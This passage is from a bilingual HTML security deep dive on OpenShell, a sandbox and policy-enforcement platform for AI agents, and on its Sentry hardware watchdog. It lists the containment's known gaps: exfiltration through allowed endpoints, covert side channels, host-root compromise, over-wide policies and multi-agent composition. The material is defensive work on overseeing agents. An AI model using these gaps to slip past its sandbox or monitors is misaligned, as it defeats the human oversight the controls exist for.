+            <li><strong data-en="Model-layer jailbreak (content):" data-zh="模型層 jailbreak（內容）：">Model-layer jailbreak (content):</strong> <span data-en="guardrails are probabilistic classification; OpenShell is an execution boundary. A model can still emit harmful or false text — it just cannot act on it without authorisation. Pair with NeMo Guardrails + human review; never use OpenShell as a content moderator." data-zh="guardrails 是機率性分類；OpenShell 是執行邊界。模型仍可能產生有害或不實文字——只是無法未經授權據此行動。應搭配 NeMo Guardrails 與人工覆核；不要把 OpenShell 當內容審查器。">guardrails are probabilistic classification; OpenShell is an execution boundary. A model can still emit harmful or false text — it just cannot act on it without authorisation. Pair with NeMo Guardrails + human review; never use OpenShell as a content moderator.</span></li>
+            <li><strong data-en="Malicious or poisoned model weights:" data-zh="惡意或被污染的模型權重：">Malicious or poisoned model weights:</strong> <span data-en="the sandbox does not verify weights; confidential-computing attestation proves environment and firmware, not training-data provenance. Use model signing, SBOM and provenance checks." data-zh="sandbox 不驗證權重本身；confidential computing 的 attestation 證明環境與韌體，不證明訓練資料來源。應使用模型簽署、SBOM 與來源驗證。">the sandbox does not verify weights; confidential-computing attestation proves environment and firmware, not training-data provenance. Use model signing, SBOM and provenance checks.</span></li>
+            <li><strong data-en="Insider policy authoring:" data-zh="政策制定者（內部）風險：">Insider policy authoring:</strong> <span data-en="the prover checks a policy against the operator-defined boundary; if the boundary itself is too wide — or its author can also change the boundary — the proof loses meaning. Auto-approval amplifies this. Separate boundary approval from routine policy changes, require four-eyes, keep tamper-evident change logs." data-zh="prover 檢查的是政策是否超出 operator-defined boundary；若 boundary 本身過寬、或制定者也能改 boundary，證明即失去意義。自動批准會放大此風險。Boundary 變更須與一般政策變更分離審批、採四眼原則、變更日誌須防竄改。">the prover checks a policy against the operator-defined boundary; if the boundary itself is too wide — or its author can also change the boundary — the proof loses meaning. Auto-approval amplifies this. Separate boundary approval from routine policy changes, require four-eyes, keep tamper-evident change logs.</span></li>
+            <li><strong data-en="Exfiltration via allowed endpoints:" data-zh="經允許端點的外洩：">Exfiltration via allowed endpoints:</strong> <span data-en="data can still leave through endpoints the policy allows. Policy correctness is a precondition, not an outcome — pair with data classification, DLP, output inspection and periodic allowlist pruning." data-zh="資料仍可經政策允許的端點離開。政策正確性是前提、不是結果——應搭配資料分類、DLP、輸出檢查與 allowlist 定期收斂。">data can still leave through endpoints the policy allows. Policy correctness is a precondition, not an outcome — pair with data classification, DLP, output inspection and periodic allowlist pruning.</span></li>
+            <li><strong data-en="Side channels:" data-zh="Side channel：">Side channels:</strong> <span data-en="secondary analysis says OpenShell does not address timing / error-message / covert channels; the verification pass found no official guarantee or denial either way — treat as an open question, not a confirmed limitation." data-zh="二手分析稱 OpenShell 不處理時序／錯誤訊息／隱蔽通道；查證時在官方文件中既未找到保證也未找到否認——應列為開放問題，而非已確認的限制。">secondary analysis says OpenShell does not address timing / error-message / covert channels; the verification pass found no official guarantee or denial either way — treat as an open question, not a confirmed limitation.</span></li>
+            <li><strong data-en="Kernel / firmware / host-root compromise (without Sentry):" data-zh="核心／韌體／host root 攻陷（無 Sentry 時）：">Kernel / firmware / host-root compromise (without Sentry):</strong> <span data-en="without BlueField-4, host-root compromise can undermine the software boundary. Sentry's continued operation in that scenario is a vendor claim (Section 16)." data-zh="沒有 BlueField-4 時，host root 攻陷可能削弱軟體邊界。Sentry 在該情境下仍可運作是廠商主張（第 16 節）。">without BlueField-4, host-root compromise can undermine the software boundary. Sentry's continued operation in that scenario is a vendor claim (Section 16).</span></li>
+            <li><strong data-en="Multi-agent composition:" data-zh="多 agent 組合：">Multi-agent composition:</strong> <span data-en="each agent's policy can be individually legal while the combination opens an over-privileged path; the prover's multi-agent check is ongoing work per the official blog." data-zh="每個 agent 的政策各自合法，合併後仍可能形成越權路徑；依官方部落格，prover 的多 agent 檢查仍是 ongoing work。">each agent's policy can be individually legal while the combination opens an over-privileged path; the prover's multi-agent check is ongoing work per the official blog.</span></li>
+          </ul>
+        </div>
+      </details>
+
+      <div class="note warn">
+        <div class="note-t" data-en="Vendor-reported defence claims — not verified results" data-zh="廠商自述的防禦主張——非已驗證結果">Vendor-reported defence claims — not verified results <span class="tag vendor" data-en="Vendor-reported" data-zh="廠商主張">Vendor-reported</span></div>
+        <p style="margin:0" data-en="Claims that the platform “could have prevented” the summer Hugging Face intrusion are vendor inference repeated in secondary reporting, not a retrospective test. Secondary corrections note the incident's causes look closer to test-environment misconfiguration (network left open, some monitoring disabled) than to a novel kernel-escape technique — which cuts both ways: if policy allows the network path, or safeguards are switched off by a human, no sandbox can conjure the missing control. The same status applies to Sentry's millisecond quarantine and the Vera performance figures in Section 16." data-zh="「本可防止」夏季 Hugging Face 入侵的主張，是廠商推論經二手報導轉述，並非回溯測試結果。二手修正指出，該事件成因更接近測試環境設定錯誤（網路未關閉、部分監控被停用），而非新型核心逃逸技術——這是雙面刃：若政策本身允許該網路路徑、或 safeguards 被人為關閉，sandbox 也無法憑空補上缺失的控制。Sentry 的毫秒級隔離與第 16 節的 Vera 效能數字，狀態相同。">Claims that the platform “could have prevented” the summer Hugging Face intrusion are vendor inference repeated in secondary reporting, not a retrospective test. Secondary corrections note the incident's causes look closer to test-environment misconfiguration (network left open, some monitoring disabled) than to a novel kernel-escape technique — which cuts both ways: if policy allows the network path, or safeguards are switched off by a human, no sandbox can conjure the missing control. The same status applies to Sentry's millisecond quarantine and the Vera performance figures in Section 16.</p>
+      </div>
+    </section>
+
+    <!-- ============ 14 · PRINCIPLES ============ -->
+    <section class="chapter" id="s14">
+      <div class="ch-head"><span class="ch-num">14</span><h2 data-en="Seven design principles" data-zh="七項設計原則">Seven design principles</h2><span class="tag d0003">D0003</span></div>
+      <div class="principles">
+        <div class="principle"><div class="p-num">P1</div><h4 data-en="Outbound-only connection" data-zh="Outbound-only 連線">Outbound-only connection</h4><p data-en="The Supervisor connects out to the Gateway, never the reverse. Sandbox compromise cannot pivot to the Gateway." data-zh="Supervisor 向外連向 Gateway，永不反向。Sandbox 被攻陷也無法以 Gateway 為跳板。">The Supervisor connects out to the Gateway, never the reverse. Sandbox compromise cannot pivot to the Gateway.</p></div>
+        <div class="principle"><div class="p-num">P2</div><h4 data-en="Static + dynamic split" data-zh="Static + dynamic 切分">Static + dynamic split</h4><p data-en="Kernel-level policies (filesystem, process) lock at creation because they cannot be safely relaxed. Application-level policies (network, inference) hot-reload for operational flexibility." data-zh="核心層政策（filesystem、process）在建立時鎖定，因其無法安全放寬。應用層政策（network、inference）可 hot-reload，保留操作彈性。">Kernel-level policies (filesystem, process) lock at creation because they cannot be safely relaxed. Application-level policies (network, inference) hot-reload for operational flexibility.</p></div>
+        <div class="principle"><div class="p-num">P3</div><h4 data-en="Restrictive default" data-zh="限制性預設">Restrictive default</h4><p data-en="Empty policies deny everything. No filesystem paths means no access; no network rules means no egress. Policy must explicitly grant." data-zh="空政策等於全部拒絕。沒有 filesystem 路徑就是無存取；沒有網路規則就是無 egress。存取必須由政策明確授予。">Empty policies deny everything. No filesystem paths means no access; no network rules means no egress. Policy must explicitly grant.</p></div>
+        <div class="principle"><div class="p-num">P4</div><h4 data-en="Credential separation" data-zh="憑證分離">Credential separation</h4><p data-en="Credentials are stored gateway-side only, injected at sandbox creation, and agent-originated credentials are stripped and replaced by the proxy." data-zh="憑證只存於 Gateway 側，在 sandbox 建立時注入；agent 自帶憑證由 proxy 剝除並替換。">Credentials are stored gateway-side only, injected at sandbox creation, and agent-originated credentials are stripped and replaced by the proxy.</p></div>
+        <div class="principle"><div class="p-num">P5</div><h4 data-en="Formal verification before deployment" data-zh="部署前形式驗證">Formal verification before deployment</h4><p data-en="The Z3 prover mathematically checks policy correctness before application — pre-deployment prevention, not runtime detection." data-zh="Z3 prover 在政策套用前以數學方式檢查其正確性——是部署前預防，不是執行期偵測。">The Z3 prover mathematically checks policy correctness before application — pre-deployment prevention, not runtime detection.</p></div>
+        <div class="principle"><div class="p-num">P6</div><h4 data-en="Compute-agnostic" data-zh="Compute 無關">Compute-agnostic</h4><p data-en="One ComputeDriver gRPC contract; the same security model across Docker, Podman, Kubernetes and MicroVM." data-zh="單一 ComputeDriver gRPC 合約；Docker、Podman、Kubernetes 與 MicroVM 共用同一安全模型。">One <code>ComputeDriver</code> gRPC contract; the same security model across Docker, Podman, Kubernetes and MicroVM.</p></div>
+        <div class="principle"><div class="p-num">P7</div><h4 data-en="OCSF-native logging" data-zh="OCSF 原生日誌">OCSF-native logging</h4><p data-en="Security events in OCSF v1.7.0 from day one; the dual-emit pattern routes findings to both operational and security pipelines." data-zh="安全事件自第一天即採 OCSF v1.7.0；dual-emit 模式讓 finding 同時抵達營運與安全管線。">Security events in OCSF v1.7.0 from day one; the dual-emit pattern routes findings to both operational and security pipelines.</p></div>
+      </div>
+      <div class="card">
+        <h4 class="sub" style="margin-top:0" data-en="Component summary" data-zh="元件總覽">Component summary</h4>
+        <div class="tblwrap" style="margin-bottom:0"><table>
+          <thead><tr><th data-en="Component" data-zh="元件">Component</th><th data-en="What it does" data-zh="職責">What it does</th><th data-en="Key tech" data-zh="關鍵技術">Key tech</th></tr></thead>
+          <tbody>
+            <tr><td class="c"><strong>Gateway</strong></td><td data-en="Control plane: lifecycle, credentials, policy, auth" data-zh="Control plane：生命週期、憑證、政策、認證">Control plane: lifecycle, credentials, policy, auth</td><td class="c">gRPC · SQLx · OIDC · JWT</td></tr>
+            <tr><td class="c"><strong>Supervisor</strong></td><td data-en="Data plane: enforcement inside the sandbox" data-zh="Data plane：sandbox 內強制執行">Data plane: enforcement inside the sandbox</td><td class="c">Landlock · seccomp · nftables · OPA</td></tr>
+            <tr><td class="c"><strong>Process Supervisor</strong></td><td data-en="Filesystem + process policy" data-zh="Filesystem + process 政策">Filesystem + process policy</td><td class="c">Landlock LSM (syscall 444) · seccomp BPF</td></tr>
+            <tr><td class="c"><strong>Network Supervisor</strong></td><td data-en="Network + inference policy" data-zh="Network + inference 政策">Network + inference policy</td><td class="c">netns · nftables REDIRECT · OPA L7 proxy</td></tr>
+            <tr><td class="c"><strong>Inference Router</strong></td><td data-en="LLM request interception" data-zh="LLM 請求攔截">LLM request interception</td><td class="c">inference.local DNS · privacy routing</td></tr>
+            <tr><td class="c"><strong>Z3 Prover</strong></td><td data-en="Formal policy verification" data-zh="形式化政策驗證">Formal policy verification</td><td class="c">Z3 v0.19 · SMT constraint solving</td></tr>
+            <tr><td class="c"><strong>OCSF Logger</strong></td><td data-en="Structured security events" data-zh="結構化安全事件">Structured security events</td><td class="c">OCSF v1.7.0 · 7 event classes</td></tr>
+            <tr><td class="c"><strong>Compute Drivers</strong></td><td data-en="Backend-agnostic sandbox creation" data-zh="Backend 無關的 sandbox 建立">Backend-agnostic sandbox creation</td><td class="c">Docker · Podman · K8s · MicroVM (libkrun)</td></tr>
+            <tr><td class="c"><strong>CLI / TUI</strong></td><td data-en="Operator interface" data-zh="操作者介面">Operator interface</td><td class="c">gRPC client · Ratatui</td></tr>
+          </tbody>
+        </table></div>
+      </div>
+    </section>
+
+    <!-- ============ 15 · AIDR ============ -->
+    <section class="chapter" id="s15">
+      <div class="ch-head"><span class="ch-num">15</span><h2 data-en="AIDR Layer 0 integration" data-zh="AIDR Layer 0 整合">AIDR Layer 0 integration</h2><span class="tag user" data-en="User framing — not an NVIDIA claim" data-zh="使用者框架——非 NVIDIA 主張">User framing — not an NVIDIA claim</span></div>
+      <p class="ch-sub" data-en="AIDR is the user's own architecture framing, not NVIDIA terminology. Inside it, OpenShell is Layer 0 — the foundational enforcement layer every other component sits above." data-zh="AIDR 是使用者自家的架構框架，不是 NVIDIA 的術語。在此框架中，OpenShell 是 Layer 0——所有其他元件都架在其上的基礎強制層。">AIDR is the user's own architecture framing, not NVIDIA terminology. Inside it, OpenShell is <strong>Layer 0</strong> — the foundational enforcement layer every other component sits above.</p>
+
+      <div class="aidr">
+        <div class="layer"><span class="lv">Layer 3</span><strong>Identity</strong><span class="ld" data-en="ACL / GPO policy source" data-zh="ACL / GPO 政策來源">ACL / GPO policy source</span></div>
+        <div class="layer"><span class="lv">Layer 2.5</span><strong>LLM Gateway</strong><span class="ld" data-en="real-time LLM traffic inspection" data-zh="即時 LLM 流量檢查">real-time LLM traffic inspection</span></div>
+        <div class="layer"><span class="lv">Layer 2</span><strong>AGG</strong><span class="ld" data-en="resource governance, MCP proxy" data-zh="資源治理、MCP proxy">resource governance, MCP proxy</span></div>
+        <div class="layer"><span class="lv">Layer 1</span><strong>Omnigent</strong><span class="ld" data-en="agent runtime governance" data-zh="Agent runtime 治理">agent runtime governance</span></div>
+        <div class="layer l0"><span class="lv">Layer 0</span><strong>OpenShell</strong><span class="ld" data-en="kernel-level OS enforcement — this deep dive" data-zh="核心層 OS 強制執行——本深掘的主題">kernel-level OS enforcement — this deep dive</span></div>
+      </div>
+
+      <h3 class="sub" data-en="Integration contracts needed" data-zh="需要的整合合約">Integration contracts needed</h3>
+      <div class="tblwrap"><table>
+        <thead><tr><th data-en="Integration" data-zh="整合">Integration</th><th data-en="Direction" data-zh="方向">Direction</th><th>Protocol</th><th data-en="Purpose" data-zh="用途">Purpose</th></tr></thead>
+        <tbody>
+          <tr><td class="c">OpenShell → AGG</td><td data-en="OCSF events" data-zh="OCSF 事件">OCSF events</td><td data-en="Event bus" data-zh="Event bus">Event bus</td><td data-en="Network denials, process lifecycle → AGG anomaly correlation" data-zh="網路拒絕、程序生命週期 → AGG 異常關聯">Network denials, process lifecycle → AGG anomaly correlation</td></tr>
+          <tr><td class="c">AGG → OpenShell</td><td data-en="Policy commands" data-zh="政策指令">Policy commands</td><td class="c">gRPC</td><td data-en="AGG anomaly triggers network policy tightening" data-zh="AGG 異常觸發網路政策收緊">AGG anomaly triggers network policy tightening</td></tr>
+          <tr><td class="c">OpenShell → Omnigent</td><td data-en="Process events" data-zh="程序事件">Process events</td><td data-en="Event bus" data-zh="Event bus">Event bus</td><td data-en="Agent process lifecycle → Omnigent session management" data-zh="Agent 程序生命週期 → Omnigent session 管理">Agent process lifecycle → Omnigent session management</td></tr>
+          <tr><td class="c">Omnigent → OpenShell</td><td data-en="Session context" data-zh="Session context">Session context</td><td class="c">gRPC</td><td data-en="Omnigent session metadata → OpenShell sandbox labels" data-zh="Omnigent session metadata → OpenShell sandbox labels">Omnigent session metadata → OpenShell sandbox labels</td></tr>
+          <tr><td class="c">Identity → OpenShell</td><td>ACL / GPO</td><td data-en="Policy store" data-zh="Policy store">Policy store</td><td data-en="Enterprise identity policies → sandbox policy composition" data-zh="企業身分政策 → sandbox 政策組合">Enterprise identity policies → sandbox policy composition</td></tr>
+          <tr><td class="c">OpenShell → SIEM</td><td>OCSF JSONL</td><td data-en="Log pipeline" data-zh="Log pipeline">Log pipeline</td><td data-en="All security events → enterprise SIEM" data-zh="所有安全事件 → 企業 SIEM">All security events → enterprise SIEM</td></tr>
+          <tr><td class="c">SkillSpector → OpenShell</td><td data-en="Scan results" data-zh="掃描結果">Scan results</td><td>CI/CD</td><td data-en="Pre-deploy scan → policy generation for MCP server access" data-zh="部署前掃描 → 產生 MCP server 存取政策">Pre-deploy scan → policy generation for MCP server access</td></tr>
+        </tbody>
+      </table></div>
+
+      <div class="note bad">
+        <div class="note-t" data-en="Status, stated plainly: none of these integrations are built" data-zh="狀態直說：這些整合都尚未建成">Status, stated plainly: none of these integrations are built</div>
+        <p style="margin:0" data-en="Per D0003, OpenShell operates as a standalone sandbox platform. The OCSF logging format is SIEM-ready, but no pipeline connects it to AGG's telemetry or Omnigent's session store. This unbuilt seam is the primary gap identified in the AIDR notes (D0009 and the former D0006) — the contracts above are a design agenda, not shipped interfaces." data-zh="依 D0003，OpenShell 目前是獨立運作的 sandbox 平台。OCSF 日誌格式已 SIEM-ready，但沒有任何 pipeline 把它接到 AGG 的遙測或 Omnigent 的 session store。這條未建成的接縫是 AIDR 筆記（D0009 與先前的 D0006）指出的主要缺口——上表合約是設計議程，不是已交付的介面。">Per D0003, OpenShell operates as a standalone sandbox platform. The OCSF logging format is SIEM-ready, but <strong>no pipeline connects it</strong> to AGG's telemetry or Omnigent's session store. This unbuilt seam is the primary gap identified in the AIDR notes (D0009 and the former D0006) — the contracts above are a design agenda, not shipped interfaces.</p>
+      </div>
+    </section>
+
+    <!-- ============ 16 · LIMITATIONS ============ -->
+    <section class="chapter" id="s16">
+      <div class="ch-head"><span class="ch-num">16</span><h2 data-en="Limitations &amp; open questions" data-zh="限制與開放問題">Limitations &amp; open questions</h2><span class="tag docs" data-en="Docs verified" data-zh="文件實查">Docs verified</span><span class="tag unconf" data-en="Unconfirmed items marked" data-zh="未確認項已標示">Unconfirmed items marked</span></div>
+      <p class="ch-sub" data-en="What to press on before running agents against sensitive internal data. Items are ordered roughly by how directly they weaken the guarantees in Sections 1–15." data-zh="在對敏感內部資料運行 agent 之前，必須追問的事項。排序大致依其削弱第 1–15 節保證的直接程度。">What to press on before running agents against sensitive internal data. Items are ordered roughly by how directly they weaken the guarantees in Sections 1–15.</p>
+
+      <details open>
+        <summary data-en="1 · Kernel &amp; version dependence" data-zh="1 · 核心與版本相依">1 · Kernel &amp; version dependence</summary>
+        <div class="det-body"><p style="margin:0" data-en="Landlock ABI 3+, nested seccomp user-notification and task-memory access requirements mean older-kernel distributions (RHEL 9.x class) may downgrade or fail closed. macOS runs through a Docker Desktop Linux VM and Windows through WSL 2 (experimental) — neither is a native kernel path. Separately, the platform is moving fast: 0.1.0 at the 2026-09-28 launch, docs already at v0.1.6 when checked on 2026-10-29. Policy semantics, prover scope and the support matrix can all shift between versions — pin a version and re-run policy and log-integrity tests on every upgrade." data-zh="Landlock ABI 3+、巢狀 seccomp user-notification 與 task-memory access 等要求，意味舊核心發行版（RHEL 9.x 等級）可能降級或 fail closed。macOS 經 Docker Desktop Linux VM、Windows 經 WSL 2（實驗性）執行——兩者皆非原生核心路徑。另外，平台演進很快：2026-09-28 發表時 0.1.0，2026-10-29 實查文件已是 v0.1.6。政策語義、prover 範圍與 support matrix 都可能隨版本改變——鎖定版本，並在每次升級重跑政策與日誌完整性測試。">Landlock ABI 3+, nested seccomp user-notification and task-memory access requirements mean older-kernel distributions (RHEL 9.x class) may downgrade or fail closed. macOS runs through a Docker Desktop Linux VM and Windows through WSL 2 (experimental) — neither is a native kernel path. Separately, the platform is moving fast: 0.1.0 at the 2026-09-28 launch, docs already at <strong>v0.1.6</strong> when checked on 2026-10-29. Policy semantics, prover scope and the support matrix can all shift between versions — pin a version and re-run policy and log-integrity tests on every upgrade.</p></div>
+      </details>
+      <details>
+        <summary data-en="2 · Supervisor-as-PID 1 attack surface" data-zh="2 · Supervisor 作為 PID 1 的攻擊面">2 · Supervisor-as-PID 1 attack surface</summary>
+        <div class="det-body"><p style="margin:0" data-en="The semi-trusted tier is the design's own acknowledged tension: the Supervisor holds Landlock/seccomp privilege and network-namespace control from inside the boundary it polices. seccomp blocks the agent's ptrace/mount paths against it, and the outbound-only model limits blast radius — but a supervisor vulnerability is a boundary vulnerability, and the split Mode topologies exist partly to shrink what any one supervisor process must hold." data-zh="半受信任層是此設計自承的張力：Supervisor 在它所管轄的邊界之內，持有 Landlock/seccomp 特權與 network namespace 控制權。seccomp 阻擋了 agent 對它的 ptrace/mount 路徑，outbound-only 模型也限制了影響範圍——但 supervisor 的漏洞就是邊界的漏洞，而 Mode 拆分拓撲存在的部分理由，正是縮小單一 supervisor 程序必須持有的權限。">The semi-trusted tier is the design's own acknowledged tension: the Supervisor holds Landlock/seccomp privilege and network-namespace control from <em>inside</em> the boundary it polices. seccomp blocks the agent's ptrace/mount paths against it, and the outbound-only model limits blast radius — but a supervisor vulnerability is a boundary vulnerability, and the split Mode topologies exist partly to shrink what any one supervisor process must hold.</p></div>
+      </details>
+      <details>
+        <summary data-en="3 · Policy-authoring burden" data-zh="3 · 政策撰寫負擔">3 · Policy-authoring burden</summary>
+        <div class="det-body"><p style="margin:0" data-en="Least privilege means enumerating files, hosts, methods, paths, binaries and credentials one by one. Too wide and the sandbox is theatre; too strict and the draft-approval queue becomes the bottleneck. Auto-approval relieves the friction while introducing the opposite risk — a newly public host passing with no prover findings. Treat allowlist pruning as scheduled maintenance, not cleanup." data-zh="最小授權意味逐一盤點檔案、主機、方法、路徑、binary 與憑證。太寬，sandbox 淪為劇場；太嚴，draft 批准佇列成為瓶頸。自動批准緩解摩擦，同時引入相反風險——新公開主機在 prover 無發現時自動通過。Allowlist 收斂應排入定期維護，而非事後清理。">Least privilege means enumerating files, hosts, methods, paths, binaries and credentials one by one. Too wide and the sandbox is theatre; too strict and the draft-approval queue becomes the bottleneck. Auto-approval relieves the friction while introducing the opposite risk — a newly public host passing with no prover findings. Treat allowlist pruning as scheduled maintenance, not cleanup.</p></div>
+      </details>
+      <details>
+        <summary data-en="4 · Supervisor as performance single point" data-zh="4 · Supervisor 是效能單點">4 · Supervisor as performance single point</summary>
+        <div class="det-body"><p style="margin:0" data-en="Every egress byte passes through the supervisor and its OPA evaluation. NVIDIA's public performance language is qualitative — “minimal overhead” on Vera, “up to 80% faster sandbox performance” on the platform page — with no published configuration, baseline or third-party data. Load-test with your own workload: supervisor latency and concurrency, sandbox start time, and the effect of policy hot-reload on running tasks." data-zh="每個 egress byte 都經過 supervisor 與其 OPA 評估。NVIDIA 公開的效能說法是定性的——Vera 上「minimal overhead」、平台頁「up to 80% faster sandbox performance」——未附測試配置、基準或第三方數據。以自家 workload 壓測：supervisor 延遲與併發、sandbox 啟動時間、政策 hot-reload 對執行中任務的影響。">Every egress byte passes through the supervisor and its OPA evaluation. NVIDIA's public performance language is qualitative — “minimal overhead” on Vera, “up to 80% faster sandbox performance” on the platform page — with no published configuration, baseline or third-party data. <span class="tag vendor" data-en="Vendor-reported" data-zh="廠商主張">Vendor-reported</span> Load-test with your own workload: supervisor latency and concurrency, sandbox start time, and the effect of policy hot-reload on running tasks.</p></div>
+      </details>
+      <details>
+        <summary data-en="5 · Credential env-vs-proxy tension" data-zh="5 · 憑證 env vs proxy 的張力">5 · Credential env-vs-proxy tension</summary>
+        <div class="det-body"><p style="margin:0" data-en="See the reconciliation note in Section 8. Open questions for a pinned version: exactly which provider material is materialised into the sandbox environment, what the agent can read from its own env and /proc, and how revocation propagates to already-running sandboxes. These are answerable from the code and docs at your version — they are not answered by marketing copy in either direction." data-zh="見第 8 節的對照釐清。鎖定版本下待答的問題：究竟哪些 provider 材料被 materialise 進 sandbox 環境、agent 能從自身 env 與 /proc 讀到什麼、撤銷如何傳播到已在執行的 sandbox。這些問題可由該版本的程式碼與文件回答——任一方向的行銷文案都回答不了。">See the reconciliation note in Section 8. Open questions for a pinned version: exactly which provider material is materialised into the sandbox environment, what the agent can read from its own env and <code>/proc</code>, and how revocation propagates to already-running sandboxes. These are answerable from the code and docs at your version — they are not answered by marketing copy in either direction.</p></div>
+      </details>
+      <details>
+        <summary data-en="6 · Prover coverage limits" data-zh="6 · Prover 涵蓋範圍限制">6 · Prover coverage limits</summary>
+        <div class="det-body"><p style="margin:0" data-en="The prover proves properties of modelled permissions — not that the whole application, its dependencies and its deployment config are sound, and not that a logically consistent policy is business-appropriate. Multi-agent composition is ongoing work (official blog). Whether GraphQL / MCP / WebSocket / JSON-RPC rules are modelled is reported no by an independent test summary but was not confirmed line-by-line against pinned-version docs in the verification pass — verify before relying on the prover for those protocols." data-zh="Prover 證明的是 modelled permissions 的性質——不是整個應用、其相依套件與部署組態皆無漏洞，也不是邏輯一致的政策在業務上就適當。多 agent 組合是 ongoing work（官方部落格）。GraphQL / MCP / WebSocket / JSON-RPC 規則是否被建模，獨立測試摘要稱否，但查證時未以鎖定版本文件逐字確認——在這些協定上依賴 prover 前先自行驗證。">The prover proves properties of <em>modelled</em> permissions — not that the whole application, its dependencies and its deployment config are sound, and not that a logically consistent policy is business-appropriate. Multi-agent composition is ongoing work (official blog). Whether GraphQL / MCP / WebSocket / JSON-RPC rules are modelled is reported “no” by an independent test summary but was not confirmed line-by-line against pinned-version docs in the verification pass — verify before relying on the prover for those protocols.</p></div>
+      </details>
+      <details>
+        <summary data-en="7 · Sentry: the hardware boundary (short version)" data-zh="7 · Sentry：硬體邊界（簡版）">7 · Sentry: the hardware boundary (short version)</summary>
+        <div class="det-body"><p data-en="This deep dive is about OpenShell's architecture; Sentry enters only as its hardware boundary. Sentry is a reference system design running on BlueField-4 DPU — an out-of-band watchdog in a trust domain isolated from agent and host software, built on DOCA, able to inspect agent requests/responses, provide attested telemetry, verify agent identity and enforce granular zero-trust policies. Two separations matter:" data-zh="本深掘的主題是 OpenShell 架構；Sentry 僅以其硬體邊界的身分出現。Sentry 是跑在 BlueField-4 DPU 上的 reference system design——一個 out-of-band watchdog，位於與 agent 及 host 軟體隔離的 trust domain，建立在 DOCA 之上，可檢查 agent 的請求與回應、提供 attested telemetry、驗證 agent 身分、執行細粒度 zero-trust 政策。兩個區分最重要：">This deep dive is about OpenShell's architecture; Sentry enters only as its hardware boundary. Sentry is a <strong>reference system design</strong> running on BlueField-4 DPU — an out-of-band watchdog in a trust domain isolated from agent and host software, built on DOCA, able to inspect agent requests/responses, provide attested telemetry, verify agent identity and enforce granular zero-trust policies. Two separations matter:</p>
+        <ul>
+          <li data-en="OpenShell software does not require BlueField-4. The official FAQ is explicit: it runs on supported local, on-prem, cloud and Kubernetes infrastructure without it. What requires BlueField-4 is Sentry's hardware-isolated guarantee — monitoring that keeps working even if host or workload is compromised." data-zh="OpenShell 軟體不需要 BlueField-4。官方 FAQ 明言：它可在受支援的本地、on-prem、雲端與 Kubernetes 基礎設施上執行。需要 BlueField-4 的是 Sentry 的硬體隔離保證——即使 host 或 workload 被攻陷仍可運作的監控。">OpenShell software does <strong>not</strong> require BlueField-4. The official FAQ is explicit: it runs on supported local, on-prem, cloud and Kubernetes infrastructure without it. What requires BlueField-4 is Sentry's hardware-isolated guarantee — monitoring that keeps working even if host or workload is compromised.</li>
+          <li data-en="“Quarantines and stops it in milliseconds”, “up to 20% more agent capacity” (2026-10-21 release) and the Vera performance figures are NVIDIA claims with no published measurement method, load conditions or false-positive rates, and no independent or peer-reviewed verification was found as of late October 2026. Sentry's detection logic — how it decides an agent is “out of bounds” — is likewise unpublished. Treat Sentry as a design target, not a measured benchmark." data-zh="「在毫秒內隔離並停止」、「agent capacity 提升 up to 20%」（2026-10-21 新聞稿）與 Vera 效能數字皆為 NVIDIA 主張，未附量測方法、負載條件或誤判率；截至 2026 年 10 月下旬未找到獨立或同行評審驗證。Sentry 的偵測邏輯——如何判定 agent「超出邊界」——同樣未公開。應把 Sentry 視為設計目標，而非已量測的基準。">“Quarantines and stops it in milliseconds”, “up to 20% more agent capacity” (2026-10-21 release) and the Vera performance figures are NVIDIA claims with no published measurement method, load conditions or false-positive rates, and no independent or peer-reviewed verification was found as of late October 2026. <span class="tag vendor" data-en="Vendor-reported, unverified" data-zh="廠商主張，未驗證">Vendor-reported, unverified</span> Sentry's detection logic — how it decides an agent is “out of bounds” — is likewise unpublished. Treat Sentry as a design target, not a measured benchmark.</li>
+        </ul>
+        <p style="margin:0" data-en="Also unconfirmed: any x86 / non-NVIDIA-chip Sentry roadmap or pricing (secondary reporting says no date; official texts commit to neither), and NemoClaw GDPR / HIPAA / SOC 2 certification claims, which appear only in secondary marketing roundups, not in the official NemoClaw docs checked. An OCSF log format is not itself SOC 2 / GDPR / HIPAA compliance — log integrity, retention, access control and data minimisation remain the deploying organisation's design work." data-zh="同樣未確認：任何 x86／非 NVIDIA 晶片的 Sentry 路線圖或價格（二手報導稱無日期；官方文本兩者皆未承諾），以及 NemoClaw 的 GDPR / HIPAA / SOC 2 認證聲明——僅見於二手行銷整理，未見於所查的官方 NemoClaw 文件。OCSF 日誌格式本身不等於 SOC 2 / GDPR / HIPAA 合規——日誌完整性、保留期限、存取控制與資料最小化仍是部署組織的設計責任。">Also unconfirmed: any x86 / non-NVIDIA-chip Sentry roadmap or pricing (secondary reporting says no date; official texts commit to neither), and NemoClaw GDPR / HIPAA / SOC 2 certification claims, which appear only in secondary marketing roundups, not in the official NemoClaw docs checked. An OCSF log format is not itself SOC 2 / GDPR / HIPAA compliance — log integrity, retention, access control and data minimisation remain the deploying organisation's design work.</p></div>
+      </details>
+      <details>
+        <summary data-en="8 · Telemetry default &amp; partner-list hygiene" data-zh="8 · 遙測預設與夥伴名單衛生">8 · Telemetry default &amp; partner-list hygiene</summary>
+        <div class="det-body"><p style="margin:0" data-en="Secondary reporting notes OpenShell collects anonymous telemetry by default, disableable via OPENSHELL_TELEMETRY_ENABLED=false, a Helm setting, or compile-time removal — decide and record this explicitly when handling sensitive data. And when citing ecosystem support, keep the two partner lists separate: the 2026-09-28 launch release names its own set (Anthropic, Cisco, CrowdStrike, SpaceXAI, Salesforce, SAP, …; “over 100 organisations” in aggregate, with verb strengths from deployed to exploring), while Google Cloud and TrendAI appear in the broader 2026-10-21 Reference Architecture release. “Partner” never means “deployed customer” — preserve the original verb strength when quoting." data-zh="二手報導指出 OpenShell 預設收集匿名遙測，可經 OPENSHELL_TELEMETRY_ENABLED=false、Helm 設定或編譯時移除來關閉——處理敏感資料時應明確決定並記錄。引用生態系支持時，兩份夥伴名單要分開：2026-09-28 發表新聞稿有其自家名單（Anthropic、Cisco、CrowdStrike、SpaceXAI、Salesforce、SAP……；總計稱「over 100 organisations」，動詞強度從已部署到探索中不等），Google Cloud 與 TrendAI 則出現在範圍更廣的 2026-10-21 Reference Architecture 新聞稿。「合作夥伴」永不等於「已上線客戶」——引用時保留原始動詞強度。">Secondary reporting notes OpenShell collects anonymous telemetry by default, disableable via <code>OPENSHELL_TELEMETRY_ENABLED=false</code>, a Helm setting, or compile-time removal — decide and record this explicitly when handling sensitive data. And when citing ecosystem support, keep the two partner lists separate: the 2026-09-28 launch release names its own set (Anthropic, 